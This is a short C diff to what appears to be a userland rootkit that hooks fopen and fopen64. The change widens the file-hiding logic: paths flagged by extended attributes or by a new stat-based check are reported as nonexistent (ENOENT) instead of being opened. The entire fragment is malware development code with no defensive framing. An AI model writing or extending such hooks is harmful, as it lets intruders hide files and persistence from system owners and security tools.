@@ -40,7 +40,7 @@ FILE *fopen(const char *path, const char *mode)
         }
     }
 
-    if(hidden_xattr(path)) { errno = ENOENT; return NULL; }
+    if(hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32)) { errno = ENOENT; return NULL; }
 
     return old_fopen(path, mode);
 }
@@ -86,7 +86,7 @@ FILE *fopen64(const char *path, const char *mode)
         }
     }
 
-    if(hidden_xattr(path)) { errno = ENOENT; return NULL; }
+    if(hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 64)) { errno = ENOENT; return NULL; }
 
     return old_fopen64(path, mode);
 }
